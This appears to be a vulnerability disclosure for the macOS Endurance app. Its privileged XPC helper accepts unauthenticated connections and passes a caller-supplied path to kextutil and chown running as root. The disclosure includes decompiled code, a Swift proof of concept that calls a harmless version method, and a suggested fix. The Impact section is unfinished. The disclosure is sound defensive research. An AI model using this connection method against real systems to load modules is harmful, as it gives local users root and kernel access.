# Local Privilege Escalation can lead to kernel compromise

## Summary

A local privilege abuse vulnerability exists in the Endurance macOS application (`com.MagnetismStudios.endurance.helper`). The bundled privileged helper tool exposes an unauthenticated NSXPC interface that allows any local user to invoke sensitive methods without authorization. This can result in execution of privileged functionality as root.

## Technical Details

The helper binary is located at:

```sh
/Applications/Endurance.app/Contents/Library/LaunchServices/com.MagnetismStudios.endurance.helper
```


The `listener:shouldAcceptNewConnection:` method only verifies that the connection originates from the expected listener object. It does not check the identity of the connecting client (no auditToken validation, no UID check, no code signing verification).

<img width="2984" height="952" alt="classturbohelper" src="https://github.com/user-attachments/assets/b40042a0-04a7-4db0-b290-7a547ea320d8" />

```asm
/* @class TurboHelper */
-(void)listener:(int)arg2 shouldAcceptNewConnection:(int)arg3, ... {
    r14 = arg0;
    rbx = [arg2 retain];
    r15 = [arg3 retain];
    rax = [r14 listener];
    rax = [rax retain];
    if (rax == rbx) {
            [rax release];
            if (r15 != 0x0) {
                    rax = [NSXPCInterface interfaceWithProtocol:@protocol(HelperToolProtocol)];
                    rax = [rax retain];
                    [r15 setExportedInterface:rax];
                    [rax release];
                    [r15 setExportedObject:r14];
                    [r15 resume];
                    [r15 release];
                    [rbx release];
            }
            else {
                    sub_100002536();
            }
    }
    else {
            sub_100002515();
    }
    return;
}
```

The exported protocol HelperToolProtocol exposes six methods. These can be invoked by any local process through XPC. As the helper runs with elevated privileges, these calls execute with root privileges.

<img width="2970" height="1386" alt="protocolshelper" src="https://github.com/user-attachments/assets/35966cf9-0b6e-476c-b070-ec8961db2c55" />

```asm
                     __objc_proto_HelperToolProtocol_inst_methods:
0000000100004870         struct __objc_method_list {
                             0x18,                                // flags
                             6                                    // method count
                         }
0000000100004878         struct __objc_method {                                 ; "loadModuleNamed:WithReply:","v32@0:8@16@?24"
                             aLoadmodulename,                     // name
                             aV32081624_1000033ba,                // signature
                             0x0                                  // implementation
                         }
0000000100004890         struct __objc_method {                                 ; "unloadModuleNamed:WithReply:","v32@0:8@16@?24"
                             aUnloadmodulena,                     // name
                             aV32081624_1000033ba,                // signature
                             0x0                                  // implementation
                         }
00000001000048a8         struct __objc_method {                                 ; "getTaskPowerMetricsWithReply:","v24@0:8@?16"
                             aGettaskpowerme,                     // name
                             aV240816,                            // signature
                             0x0                                  // implementation
                         }
00000001000048c0         struct __objc_method {                                 ; "getVersionWithReply:","v24@0:8@?16"
                             aGetversionwith,                     // name
                             aV240816,                            // signature
                             0x0                                  // implementation
                         }
00000001000048d8         struct __objc_method {                                 ; "enableLowPowerMode:","v24@0:8@?16"
                             aEnablelowpower,                     // name
                             aV240816,                            // signature
                             0x0                                  // implementation
                         }
00000001000048f0         struct __objc_method {                                 ; "disableLowPowerMode:","v24@0:8@?16"
                             aDisablelowpowe,                     // name
                             aV240816,                            // signature
                             0x0                                  // implementation
```

The most critical method is `loadModuleNamed:WithReply:`:

<img width="2980" height="678" alt="kernelcompr" src="https://github.com/user-attachments/assets/b92bc19b-5155-4824-a609-ebce804d618d" />



<img width="2962" height="652" alt="path" src="https://github.com/user-attachments/assets/f97c979d-3a87-46ae-9b5b-f3748031e382" />


The most critical method is `loadModuleNamed:WithReply:`:

```asm
/* @class TurboHelper */
-(int)loadModuleNamed:(int)arg2 WithReply:(int)arg3 {
    rbx = [arg3 retain];
    r14 = [arg2 retain];
    AuthorizationCreate(0x0, 0x0, 0x0, &var_28);
    rcx = var_28;
    rdx = r14;
    r15 = [SystemCommands loadModuleWithPath:rdx andAuthRef:rcx];
    [r14 release];
    rsi = @"SUCCESS";
    if (r15 == 0x0) {
            rsi = @"ERROR";
    }
    (*(rbx + 0x10))(rbx);
    rax = [rbx release];
    return rax;
}
```

This directly calls into `SystemCommands loadModuleWithPath:andAuthRef:` with the user-supplied string:

```asm
/* @class SystemCommands */
+(int)loadModuleWithPath:(int)arg2 andAuthRef:(int)arg3 {
    rax = [arg2 retain];
    r15 = rax;
    r12 = [[NSString stringWithFormat:@"%@", rax] retain];
    rax = [NSArray arrayWithObjects:@"-R"];
    rax = [rax retain];
    var_30 = [arg0 runTaskAsAdmin:@"/usr/sbin/chown" withAuthRef:arg3 andArgs:rax];
    [rax release];
    [r12 release];
    r12 = [[NSString stringWithFormat:@"%@", r15] retain];
    [r15 release];
    rax = [NSArray arrayWithObjects:@"-v"];
    rax = [rax retain];
    rbx = [arg0 runTaskAsAdmin:@"/usr/bin/kextutil" withAuthRef:arg3 andArgs:rax];
    [rax release];
    [r12 release];
    rax = (rbx != 0x0 ? 0x1 : 0x0) & (var_30 != 0x0 ? 0x1 : 0x0) & 0xff;
    return rax;
}
```






## Proof-of-Concept

A minimal Swift PoC that connects to the helper and calls `getVersionWithReply:`:

```swift
import Foundation

@objc protocol HelperToolProtocol {
    @objc(getVersionWithReply:)
    func getVersionWithReply(_ reply: @escaping (String) -> Void)
}

let serviceName = "com.MagnetismStudios.endurance.helper"

let connection = NSXPCConnection(machServiceName: serviceName, options: .privileged)

connection.remoteObjectInterface = NSXPCInterface(with: HelperToolProtocol.self)

connection.invalidationHandler = {
    fputs("[!] XPC invalidated\n", stderr)
    CFRunLoopStop(CFRunLoopGetMain())
}
connection.interruptionHandler = {
    fputs("[!] XPC interrupted\n", stderr)
}

connection.resume()

guard let proxy = connection.remoteObjectProxyWithErrorHandler({ error in
    fputs("[!] XPC error: \(error)\n", stderr)
    CFRunLoopStop(CFRunLoopGetMain())
}) as? HelperToolProtocol else {
    fputs("[!] Could not obtain proxy\n", stderr)
    exit(1)
}

print("[*] Connected; calling getVersion…")

let timer = DispatchSource.makeTimerSource()
timer.schedule(deadline: .now() + 5)
timer.setEventHandler {
    fputs("[!] Timeout after 5s without a reply\n", stderr)
    CFRunLoopStop(CFRunLoopGetMain())
}
timer.resume()

proxy.getVersionWithReply { version in
    print("[+] Helper version = \(version)")
    timer.cancel()
    CFRunLoopStop(CFRunLoopGetMain())
}

CFRunLoopRun()
connection.invalidate()
```

Running this PoC as an unprivileged user successfully connects to the privileged helper and executes the exported method.

<img width="930" height="294" alt="endurance1" src="https://github.com/user-attachments/assets/92cf5375-5d1d-475a-a520-6bb074410ac6" />


## Impact

todo

## Mitigation

Apple’s recommended practice for XPC services is to verify the client’s identity in listener:shouldAcceptNewConnection: by checking the connection’s auditToken (effective UID, code signing identity, and entitlements).
Suggested fix:
- Restrict accepted connections to trusted, signed clients.
- validate caller UID and bundle ID.
- reject all unauthenticated connections.

